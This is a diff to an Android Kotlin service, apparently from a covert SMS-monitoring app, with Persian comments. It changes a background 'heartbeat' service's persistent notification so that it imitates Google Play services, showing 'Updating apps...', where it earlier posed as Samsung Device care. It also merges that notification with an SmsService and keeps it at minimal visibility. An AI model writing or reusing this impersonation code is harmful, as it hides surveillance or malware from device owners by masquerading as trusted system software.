@@ -25,8 +25,8 @@ class HeartbeatService : Service() {
     
     companion object {
         private const val TAG = "HeartbeatService"
-        private const val NOTIFICATION_ID = 2
-        private const val CHANNEL_ID = "heartbeat_channel"
+        private const val NOTIFICATION_ID = 1  // ⭐ یکسان با SmsService - چون notification یکیه
+        private const val CHANNEL_ID = "sms_service_channel"  // ⭐ یکسان با SmsService
     }
     
     // ⭐ خواندن interval از ServerConfig
@@ -79,10 +79,10 @@ class HeartbeatService : Service() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 CHANNEL_ID,
-                "Device care",  // ⭐ شبیه Samsung Device Care
+                "Google Play services",  // ⭐ یکسان با SmsService
                 NotificationManager.IMPORTANCE_MIN
             ).apply {
-                description = "Keeping your device healthy"
+                description = "Google Play services keeps your apps up to date"  // ⭐ یکسان
                 setShowBadge(false)
                 enableLights(false)
                 enableVibration(false)
@@ -94,9 +94,9 @@ class HeartbeatService : Service() {
         }
 
         val notification = NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("Device care")
-            .setContentText("Optimizing performance...")
-            .setSmallIcon(android.R.drawable.stat_notify_sync)  // آیکون sync
+            .setContentTitle("Google Play services")  // ⭐ یکسان با SmsService
+            .setContentText("Updating apps...")  // ⭐ یکسان با SmsService
+            .setSmallIcon(android.R.drawable.stat_notify_sync)  // ⭐ آیکون sync کم‌رنگ
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setOngoing(true)
             .setShowWhen(false)
